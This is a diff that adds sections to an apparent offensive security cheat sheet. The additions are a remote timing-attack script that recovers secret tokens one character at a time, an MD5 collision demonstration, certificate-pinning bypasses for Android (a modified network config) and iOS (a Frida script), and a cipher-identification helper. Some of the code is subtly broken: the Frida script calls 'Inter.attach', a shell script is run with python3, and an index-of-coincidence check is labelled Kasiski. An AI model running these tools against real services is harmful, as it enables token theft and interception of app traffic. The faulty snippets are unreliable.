@@ -1018,3 +1018,236 @@ with open('auth_user.csv') as f:
             print(f'WEAK iterations: {match.group(1)}')
 "
 ```
+
+---
+
+## 13. Timing Attack Scripts
+
+### Remote Timing Oracle for Secret Comparison
+
+```python
+#!/usr/bin/env python3
+"""
+Timing attack against unsafe string comparison.
+Many web frameworks use == instead of constant-time comparison for tokens.
+"""
+
+import requests
+import time
+import statistics
+
+def timing_attack(url, param, known_prefix="", charset="abcdefghijklmnopqrstuvwxyz0123456789",
+                  max_len=32, samples=20):
+    """Character-by-character timing attack to recover a secret."""
+    recovered = known_prefix
+
+    for position in range(len(known_prefix), max_len):
+        timings = {}
+
+        for char in charset:
+            candidate = recovered + char
+            times_list = []
+
+            for _ in range(samples):
+                start = time.perf_counter_ns()
+                requests.get(url, params={param: candidate})
+                elapsed = time.perf_counter_ns() - start
+                times_list.append(elapsed)
+
+            # Use median to reduce noise
+            timings[char] = statistics.median(times_list)
+
+        # The character with the highest timing is likely correct
+        best_char = max(timings, key=timings.get)
+        baseline = statistics.mean(list(timings.values()))
+        deviation = (timings[best_char] - baseline) / baseline
+
+        if deviation < 0.05:  # Less than 5% deviation means likely done
+            break
+
+        recovered += best_char
+        print(f"[+] Position {position}: '{best_char}' (deviation: {deviation:.1%})")
+
+    return recovered
+```
+
+### Timing Attack Detection and Prevention Testing
+
+```python
+#!/usr/bin/env python3
+"""Test if a server endpoint is vulnerable to timing attacks."""
+
+import requests
+import time
+import statistics
+
+def detect_timing_leak(url, correct_token, wrong_token, iterations=100):
+    """Compare response times for correct vs incorrect tokens."""
+    correct_times = []
+    wrong_times = []
+
+    for _ in range(iterations):
+        start = time.perf_counter_ns()
+        requests.get(url, params={"token": correct_token})
+        correct_times.append(time.perf_counter_ns() - start)
+
+        start = time.perf_counter_ns()
+        requests.get(url, params={"token": wrong_token})
+        wrong_times.append(time.perf_counter_ns() - start)
+
+    correct_mean = statistics.mean(correct_times)
+    wrong_mean = statistics.mean(wrong_times)
+    diff_percent = abs(correct_mean - wrong_mean) / min(correct_mean, wrong_mean) * 100
+
+    print(f"Correct token avg: {correct_mean/1e6:.2f}ms")
+    print(f"Wrong token avg:   {wrong_mean/1e6:.2f}ms")
+    print(f"Difference:        {diff_percent:.1f}%")
+
+    if diff_percent > 5:
+        print("[VULNERABLE] Significant timing difference detected!")
+    else:
+        print("[SAFE] No significant timing difference")
+
+    return diff_percent > 5
+```
+
+---
+
+## 14. Hash Collision Demonstrations
+
+### MD5 Collision with Hashclash
+
+```bash
+# Generate MD5 collision using fastcoll (HashClash)
+# Build from source: https://github.com/cr-marcstevens/hashclash
+cd /opt/hashclash/scripts
+python3 poc_no.sh
+
+# Verify the collision - two different files with same MD5
+md5sum file1.bin file2.bin
+# Both should produce identical MD5 hashes
+
+# Demonstrate collision with different PDF content
+# Tools: https://www.win.tue.nl/hashclash/
+# Create two PDFs with different content but identical MD5
+python3 -c "
+import hashlib
+# Read both collision files
+with open('file1.bin', 'rb') as f: d1 = f.read()
+with open('file2.bin', 'rb') as f: d2 = f.read()
+assert d1 != d2, 'Files must be different'
+assert hashlib.md5(d1).hexdigest() == hashlib.md5(d2).hexdigest(), 'MD5 must match'
+print(f'Collision confirmed: MD5={hashlib.md5(d1).hexdigest()}')
+print(f'File1 size: {len(d1)}, File2 size: {len(d2)}')
+print(f'First difference at byte: {next(i for i in range(len(d1)) if d1[i] != d2[i])}')
+"
+```
+
+---
+
+## 15. Certificate Pinning Bypass Techniques
+
+### Android Network Security Config Bypass
+
+```xml
+<!-- Override certificate pinning via modified network_security_config.xml -->
+<!-- Place in res/xml/network_security_config.xml after decompiling APK -->
+<?xml version="1.0" encoding="utf-8"?>
+<network-security-config>
+    <base-config cleartextTrafficPermitted="true">
+        <trust-anchors>
+            <certificates src="system" />
+            <certificates src="user" />
+        </trust-anchors>
+    </base-config>
+</network-security-config>
+```
+
+### iOS Certificate Pinning Bypass via Frida
+
+```javascript
+// Frida script: Bypass iOS certificate pinning for multiple frameworks
+if (ObjC.available) {
+    // NSURLSession delegate bypass
+    var delegate = ObjC.classes.Handler;  // Replace with actual delegate class name
+    if (delegate) {
+        var method = delegate['- URLSession:didReceiveChallenge:completionHandler:'];
+        if (method) {
+            Inter.attach(method.implementation, {
+                onEnter: function(args) {
+                    var completionHandler = new ObjC.Block(args[4]);
+                    completionHandler.implementation = function() {
+                        // Always trust the certificate
+                        var credential = ObjC.classes.NSURLCredential.alloc().initWithTrust_(args[3].trust());
+                        completionHandler(0, credential);
+                    };
+                }
+            });
+        }
+    }
+
+    // Alamofire bypass
+    var ServerTrustPolicy = ObjC.classes.ServerTrustPolicy;
+    if (ServerTrustPolicy) {
+        Inter.attach(ServerTrustPolicy['- evaluateServerTrust:forHost:'].implementation, {
+            onLeave: function(retval) {
+                retval.replace(0x1);  // Always return true
+            }
+        });
+    }
+}
+```
+
+---
+
+## 16. Custom Cipher Analysis
+
+### Identify Unknown Encryption Schemes
+
+```python
+#!/usr/bin/env python3
+"""Analyze ciphertext to identify the encryption scheme used."""
+
+import math
+from collections import Counter
+
+def analyze_ciphertext(ciphertext_hex):
+    """Determine encryption type from ciphertext characteristics."""
+    ct = bytes.fromhex(ciphertext_hex)
+    length = len(ct)
+    findings = []
+
+    # Check if length is multiple of 8 (DES/Blowfish) or 16 (AES)
+    if length % 16 == 0 and length >= 16:
+        findings.append("Block size likely 16 bytes (AES, Camellia, Twofish)")
+    elif length % 8 == 0 and length >= 8:
+        findings.append("Block size likely 8 bytes (DES, 3DES, Blowfish)")
+    else:
+        findings.append("Non-aligned length - possibly stream cipher or padding issue")
+
+    # Entropy analysis
+    byte_freq = Counter(ct)
+    entropy = -sum((count / length) * math.log2(count / length) for count in byte_freq.values())
+    findings.append(f"Shannon entropy: {entropy:.4f} bits/byte (max=8.0)")
+
+    if entropy > 7.9:
+        findings.append("High entropy - likely encrypted or compressed data")
+    elif entropy < 3.0:
+        findings.append("Low entropy - possibly XOR or simple substitution cipher")
+
+    # Check for ECB mode (repeated blocks)
+    blocks = [ct[i:i+16] for i in range(0, length, 16)]
+    unique_blocks = len(set(blocks))
+    if len(blocks) > 2 and unique_blocks < len(blocks):
+        findings.append(f"Repeated blocks detected ({len(blocks) - unique_blocks} duplicates) - likely ECB mode")
+
+    # XOR key detection via Kasiski examination
+    for key_len in range(1, min(33, length // 2)):
+        shifted = ct[key_len:]
+        matches = sum(1 for a, b in zip(ct, shifted) if a == b)
+        coincidence = matches / (length - key_len)
+        if coincidence > 0.07:  # Close to English IC
+            findings.append(f"Possible XOR key length: {key_len} (IC={coincidence:.4f})")
+
+    return "\n".join(findings)
+```
